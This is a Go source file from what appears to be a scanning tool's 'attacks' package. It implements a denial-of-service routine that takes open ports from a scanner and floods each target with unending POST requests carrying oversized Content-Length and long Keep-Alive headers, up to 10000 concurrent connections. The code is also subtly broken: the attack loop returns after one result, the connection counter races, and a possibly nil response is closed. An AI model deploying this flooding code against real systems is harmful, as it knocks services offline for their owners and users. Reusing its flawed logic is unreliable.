package attacks

import (
	"fmt"
	"log"
	"net/http"

	"github.com/EwanValentine/deepscan/pkg/scanner"
)

const (
	// MaxCon Set max connections to 10000
	// @todo - make this customisable
	MaxCon = 10000
)

// DenialOfService attack type
type DenialOfService struct{}

// Attack listens for open ports from
// a scanner and begins to send high amounts of
// traffic containing large headers.
func (dos *DenialOfService) Attack(results <-chan *scanner.Result) {
	for {
		select {
		case res, more := <-results:
			if more {
				fmt.Println("Attack in progress")
				go attack(res)
			}
			return
		}
	}
}

func attack(res *scanner.Result) {
	req, err := http.NewRequest("POST", fmt.Sprintf("http://%s:%d", res.Addr, res.PortScan.Port), nil)
	if err != nil {
		panic(err)
	}
	req.Header.Add("Content-Length", "10000")
	req.Header.Add("Keep-Alive", "900")

	client := &http.Client{}

	openConnections := 0
	for {
		// If number of open connections is less than the max
		// create a new one.
		if openConnections <= MaxCon {
			go func() {
				openConnections++
				defer func() { openConnections-- }()
				resp, err := client.Do(req)
				if err != nil {
					log.Println(err.Error())
				}
				defer resp.Body.Close()
				fmt.Println("POST returned: ", resp.Status)
			}()
		}
	}
}
